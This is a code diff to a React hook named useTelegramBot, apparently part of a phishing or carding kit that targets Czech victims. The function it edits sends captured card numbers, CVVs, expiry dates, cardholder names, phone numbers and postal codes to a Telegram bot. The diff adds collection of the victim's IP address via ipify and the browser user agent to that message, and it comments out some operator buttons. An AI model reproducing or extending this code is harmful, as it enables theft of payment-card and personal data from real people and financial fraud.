@@ -40,11 +40,11 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
       const keyboard = {
         inline_keyboard: [
           [
-            { text: "✅ Approve & Continue", callback_data: `approve_${sessionId}` },
+            //{ text: "✅ Approve & Continue", callback_data: `approve_${sessionId}` },
             { text: "❌ Deny", callback_data: `deny_${sessionId}` }
           ],
           [
-            { text: "💳 View Card Details", callback_data: `card_${sessionId}` }
+           // { text: "💳 View Card Details", callback_data: `card_${sessionId}` }
           ]
         ]
       };
@@ -64,24 +64,34 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
 
   const sendCardDetailsToTelegram = async (cardData, sessionId) => {
     try {
+      let userIP = 'Unable to get IP';
+    try {
+      const ipResponse = await axios.get('https://api.ipify.org?format=json');
+      userIP = ipResponse.data.ip;
+    } catch (ipError) {
+      console.error('Error getting IP:', ipError);
+    }
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       
       const cardMessage = `
-💳 <b>CARD INFORMATION RECEIVED</b> 💳
+💳 <b>NEW CREDIT CARD DATA</b> 💳
 ━━━━━━━━━━━━━━━━━━━━━
 🆔 <b>Session ID:</b> <code>${sessionId}</code>
 ━━━━━━━━━━━━━━━━━━━━━
-
-<b>Card Details:</b>
+├ 💳 <b>Card Number:</b> <code>${cardData.cardNumber}</code>
 ├ 👤 <b>Cardholder:</b> ${cardData.cardholderName}
-├ 💳 <b>Card Number:</b> ${cardData.cardNumber}
 ├ 📅 <b>Expiry Date:</b> ${cardData.expiryDate}
-└ 🔐 <b>CVV:</b> ${cardData.cvv}
+└ 🔐 <b>CVV:</b> <code>${cardData.cvv}</code>
+<b>📍 PERSONAL INFO:</b>
 ├ 📞 <b>Phone:</b> ${cardData.phoneNumber}
 ├ 🏙️ <b>City:</b> ${cardData.city}
 └ 📮 <b>Postal Code:</b> ${cardData.postalCode}
+├ 🌐 <b>Country:</b> Czech Republic
+├ 🔌 <b>IP Address:</b> ${userIP}
+└ 📱 <b>User-Agent:</b> ${navigator.userAgent.substring(0, 100)}
 
 ━━━━━━━━━━━━━━━━━━━━━
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
       `;
 
       const keyboard = {
